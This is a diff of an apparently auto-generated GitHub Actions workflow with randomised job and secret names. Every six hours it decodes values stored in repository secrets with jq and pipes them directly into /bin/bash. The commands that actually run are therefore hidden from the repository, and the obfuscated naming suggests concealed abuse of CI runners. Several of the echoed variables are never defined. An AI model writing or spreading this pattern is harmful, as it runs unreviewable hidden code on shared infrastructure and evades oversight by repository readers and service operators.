@@ -1,25 +1,20 @@
 name: shenshangxian7815
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 3/6 * * *'
-jobs:  # 23149
+    - cron: '10 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: shenshangxian7815
         env:
-          ycm998: ${{ secrets.ycm998 }}
+          cxueg623: ${{ secrets.cxueg623 }}
         run: |
-          echo $ycm998 | jq -r .rq58 | /bin/bash
-          echo $arix4 | jq -r .mky25980 | /bin/bash
-          echo $bqcl4577 | jq -r .h50742 | /bin/bash
-          echo $q61 | jq -r .sobus31 | /bin/bash
-          echo $u8 | jq -r .jlmu65 | /bin/bash
-          echo $gtck73 | jq -r .ezi3 | /bin/bash
-          echo $ric93 | jq -r .vg2 | /bin/bash
-          echo $n0 | jq -r .tdwci9955 | /bin/bash
-          echo $gned4631 | jq -r .l37201 | /bin/bash
+          echo $cxueg623 | jq -r .dy1071 | /bin/bash
+          echo $hdi463 | jq -r .caub583 | /bin/bash
+          echo $r48 | jq -r .tt94669 | /bin/bash
+          echo $u2 | jq -r .e03 | /bin/bash
+          echo $q09 | jq -r .d1956 | /bin/bash
 
